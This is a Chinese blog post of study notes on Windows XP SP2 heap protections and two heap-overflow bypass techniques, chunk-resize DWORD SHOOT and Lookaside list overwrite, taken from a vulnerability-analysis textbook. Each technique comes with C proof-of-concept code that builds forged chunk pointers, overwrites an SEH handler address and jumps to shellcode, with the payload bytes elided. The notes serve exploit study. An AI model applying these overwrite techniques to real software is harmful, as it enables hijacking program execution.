---
title: 重重保护下的堆:heap
date: 2018-03-18 17:40:58
categories:
tags:
	- 《0day2》
---

# 0x00 堆保护机制的原理

微软在堆中也增加了一些安全校验操作:



## 1. PEB random:

微软在 XP SP2 之后不再使用固定的 PEB 基址 0x7ffdf000，而是使用具有一定随机性的 PEB 基址。



## 2. Safe Unlink:

  微软改写了操作双向链表的代码，在卸载 free list 中的堆块时更加小心。

```c
// 进行删除操作时，将提前验证堆块前向指针和后向指针的完整性，以防止发生 DWORD SHOOT
int safe_remove (ListNode * node){
    if( (node->blink->flink==node)&&(node->flink->blink==node) ) {
        node -> blink -> flink = node -> flink;
        node -> flink -> blink = node -> blink;
         return 1;
    }else{
        //链表指针被破坏，进入异常
		return 0;
    } 
}
```



## 3. heap cookie:

   与栈中的 security cookie 类似，微软在堆中也引入了 cookie，用于检测 15 堆溢出的发生。

   cookie 被布置在堆首部分原堆块的 segment table 的位置，占1个字节大小。

   ![heap_1](heap/heap_1.png)



## 4. 元数据加密:

   Windows V ista 及后续版本的操作系统中开始使用该安全措施。

   块首中的一些重要数据在保存时会与一个 4 字节的随机数进行异或运算，在使用这些 数据时候需要再进行一次异或运行来还原



## 5. 也有办法破解

针对 PEB r andom 机制，指出这种变动只是 在 0x7FFDF000~0x7FFD4000 之间移动。

heap cookie，只有一个字节，其变化区间为 0~256，在研究其生成的随机算法之后，仍然存在被破解的可能。

但是即便有这些突破安全机制的思路，要想在 Windows XP SP2 以后系统上成功的利用堆 溢出漏洞仍然是一件难如登天的事情，因为这些思路一般都需要相当苛刻的条件。



# 0x01 攻击堆中存储的变量

堆中的各项保护措施是对堆块的关键结构进行保护，而对于堆中存储的内容是不保护的。

如果堆中存放着一些重要的数据或结构指针，如函数指针等内容，覆盖这些重要的内容 还是可以实现溢出的。



# 0x02 利用 chunk 重设大小攻击堆

把一个 chunk 插入到 FreeList[n]的时候有没有进行校验。

如果我们能够伪造一个 chunk 并把它插入到 FreeList[n]上不就可以造成某种攻击了。

Safe Unlink 检测到 chunk 结构已经被破坏，它还是会允许后续的一些操作执行，例如重设 chunk 的大小。



## 思路

```c
LEA EAX,DWORD PTR DS:[EDI+8]    //获取新chunk的Flink位置 
MOV DWORD PTR SS:[EBP-F0],EAX
MOV EDX,DWORD PTR DS:[ECX+4]    //*获取 伪造chunk->Blink 的值 
MOV DWORD PTR SS:[EBP-F8],EDX
MOV DWORD PTR DS:[EAX],ECX     //ECX指向伪造chunk->Flink位置 保存到 eax新chunk->Flink 的位置

MOV DWORD PTR DS:[EAX+4],EDX   //*将伪造chunk->Blink保存到新chunk->Blink ，即要写入内存的地址
MOV DWORD PTR DS:[EDX],EAX     //*将eax新chunk位置，写入指定内存

MOV DWORD PTR DS:[ECX+4],EAX    //保存下一 chunk 中的 Blink
```

这实际上是一个向任意地址写入固定值的漏洞(DWORD SHOOT)。

将内存中的某个函数指针或者 S.E.H 处 理函数指针覆盖为 shellcode 的地址，可以实现溢出。



## 代码

|            |        环境        | 备注 |
| :--------: | :----------------: | :--: |
|  操作系统  | Windows XP Pro sp2 |      |
|  编译环境  |      VC++6.0       |      |
| buildd版本 |    release版本     |      |

```C
#include <stdio.h>
#include <windows.h>
void main(){
   	char shellcode[]=
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
	"\x10\x01\x10\x00\x99\x99\x99\x99"  // 改为\x90没有影响 

     "\xEB\x06\x3A\x00" "\x00\x06\x3A\x00"
    //覆盖 Flink 和 Blink  , 拆链表的时候需要读写, 所以需要可读写
    // 0x3A06EB 即 Flink 控制 伪造chunk 的位置，
    //读取伪造chunk->Blink 即要向哪个地址写数据, 将地址写入旧chunk->Blink 
	//然后跳到EB 03x1 , 跳到shellcode  
    // 见图1
    
    "\x90\x90\x90\x90\x90\x90\x90\x90" 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
    
    "\xEB\x31"//跳转指令，跳过下面的垃圾代码
        
    "\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //字节填充控制 伪造chunk位置
   
    "\x11\x01\x10\x00\x99\x99\x99\x99"  // 改为\x90没有影响 
    "AAAA"//伪造的 Flink 和 Blink   见图2 
    "\xE4\xFF\x12\x00"
    
	"\xFC\x68\x6A\x0A\x38\x1E\x68 ........ " // shellocde ;
	   
    HLOCAL h1,h2;
    HANDLE hp;
    int zero=0;
	hp = HeapCreate(0,0x1000,0x10000);
	__asm int 3
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	memcpy(h1,shellcode,300);
    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
    zero=1/zero;
    printf("%d",zero);
}
```



图一：

![img_1](heap/img_1.png)



图2：

![img_2](heap/img_3.png)



## 参考

http://www.cnblogs.com/zcc1414/p/3982381.html

http://www.wooy0ung.me/exploit/2017/12/31/exploit-by-chunk-resize/

《0day安全 软件漏洞分析技术第二版》15.3



# 利用 Lookaside 表进行堆溢出

Safe Unlink 对空表中双向链表进行了有效性验证，而对于快表中的单链表是没有进行验证的。

正常快表拆卸一个节点的过程：
![Lookaside_1](heap/Lookaside_1.png)

借鉴前边链表拆卸过程中的指针伪造思路，如果控制 node->next 就控制了 Lookaside[n]-> next。

进而当用户再次申请空间的时候系统就会将这个伪造的地址作为申请空间的起始地址返 回给用户。

用户一旦向该空间里写入数据就会留下溢出的隐患。

![Lookaside_2](heap/Lookaside_2.png)



## 思路

1. 首先申请 3 块 16 字节的空间，然后将其释放到快表中，以便下次申请空间时可以从快表中分配。
2. 通过向 h1 中复制超长字符串来覆盖 h2 块首中下一堆块的指针。 
3. 用户申请空间时我们伪造的下一堆块地址就会被赋值给 Lookaside[2]->next，当用户再次申请空间时系统就会将我们伪造的地址作为用户申请空间的起始地址返回给用户。 
4. 当我们将这个地址设置为异常处理函数指针所在位置时就可以伪造异常处理函数了。 
5. 通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode执行。



## 利用条件

1. memcpy 赋值
2. 使用快表  有HeapAlloc 和 HeapFree后还有赋值等
3. 两次 赋值



## 代码

|           |        环境        | 备注 |
| :-------: | :----------------: | :--: |
| 操作系统  | Windows XP Pro SP2 |      |
| 编译环境  |      VC++6.0       |      |
| build版本 |      release       |      |

```c
#include<stdio.h>
#include<windows.h>
void main(){
		char shellcode []= 
			"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //填充 
			"\x03\x00\x03\x00\x5C\x01\x08\x99" //填充
			"\xE4\xFF\x13\x00" //用默认异常处理函数指针所在位置覆盖
    		"shellcode  ........ ";
		HLOCAL h1,h2,h3;
		HANDLE hp;
		int zero=0;
		hp = HeapCreate(0,0,0);
		__asm int 3
		h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
		h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
		HeapFree(hp,0,h3);  // 快表的申请和释放都是在头部。
		HeapFree(hp,0,h2);
		memcpy(h1,shellcode,300);
		h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
		h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
		memcpy(h3,"\x90\x1E\x3A\x00",4);  // \x90\x1E\x39\x00 向目标地址写入的地址
		zero=1/zero;
		printf("%d",zero);
}


```



## 参考

http://blog.csdn.net/zcc1414/article/details/22397707

《0day安全 软件漏洞分析技术第二版》15.4

